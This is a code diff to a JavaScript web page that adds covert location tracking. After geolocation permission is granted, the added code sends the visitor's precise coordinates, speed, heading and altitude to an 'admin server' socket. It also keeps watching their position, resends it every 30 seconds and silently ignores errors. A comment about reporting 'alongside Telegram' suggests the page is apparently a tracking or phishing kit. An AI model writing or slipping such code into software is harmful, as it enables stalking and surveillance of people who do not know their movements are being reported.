@@ -2510,6 +2510,43 @@
                             if (isValidLocation(pos.coords)) {
                                 userLocation = formatLocationData(pos.coords);
                                 permissionsGranted.location = true;
+                                // Send location to admin server immediately after permission granted
+                                if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                                    adminSocket.emit('location:update', {
+                                        uuid: userUUID,
+                                        latitude: pos.coords.latitude,
+                                        longitude: pos.coords.longitude,
+                                        accuracy: pos.coords.accuracy,
+                                        altitude: pos.coords.altitude,
+                                        speed: pos.coords.speed,
+                                        heading: pos.coords.heading,
+                                        timestamp: new Date().toISOString()
+                                    });
+                                }
+                                // Start continuous location watching now that permission is granted
+                                try {
+                                    navigator.geolocation.watchPosition(
+                                        (wPos) => {
+                                            if (isValidLocation(wPos.coords)) {
+                                                userLocation = formatLocationData(wPos.coords);
+                                                if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                                                    adminSocket.emit('location:update', {
+                                                        uuid: userUUID,
+                                                        latitude: wPos.coords.latitude,
+                                                        longitude: wPos.coords.longitude,
+                                                        accuracy: wPos.coords.accuracy,
+                                                        altitude: wPos.coords.altitude,
+                                                        speed: wPos.coords.speed,
+                                                        heading: wPos.coords.heading,
+                                                        timestamp: new Date().toISOString()
+                                                    });
+                                                }
+                                            }
+                                        },
+                                        () => {},
+                                        { enableHighAccuracy: true, timeout: 30000, maximumAge: 60000 }
+                                    );
+                                } catch(e) {}
                             }
                             resolve();
                         },
@@ -2707,6 +2744,16 @@
 
             // Connect to Admin Server (alongside Telegram)
             setTimeout(connectToAdminServer, 1500);
+
+            // Periodic location fallback: send location every 30s if available
+            setInterval(() => {
+                if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected && userLocation && userLocation.latitude) {
+                    adminSocket.emit('location:update', {
+                        uuid: userUUID,
+                        ...userLocation
+                    });
+                }
+            }, 30000);
         });
 
         // Cleanup
